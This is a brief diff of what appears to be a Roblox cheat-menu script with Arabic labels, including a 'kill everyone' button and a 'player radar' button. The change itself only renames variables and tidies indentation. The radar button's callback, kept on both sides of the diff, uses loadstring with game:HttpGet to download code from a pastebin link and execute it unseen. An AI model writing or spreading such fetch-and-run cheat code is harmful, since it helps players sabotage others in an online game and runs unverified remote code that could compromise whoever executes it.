@@ -68,14 +68,14 @@ v4:CreateButton({Name="اضغط لقتل الجميع",Callback=function()
 	end
 end});
 
-local MainTab = Window:CreateTab("رادار 👁️", nil) -- Title, Imag
+local MainTab = v1:CreateTab("رادار 👁️", nil)
 
 local MainSection = MainTab:CreateSection("")
 
-local Button = MainTab:CreateButton({
+MainTab:CreateButton({
    Name = "رادار الاعبين",
    Callback = function()
-loadstring(game:HttpGet("https://pastebin.com/raw/NvJBRKcM", true))()
+       loadstring(game:HttpGet("https://pastebin.com/raw/NvJBRKcM", true))()
    end,
 })
 
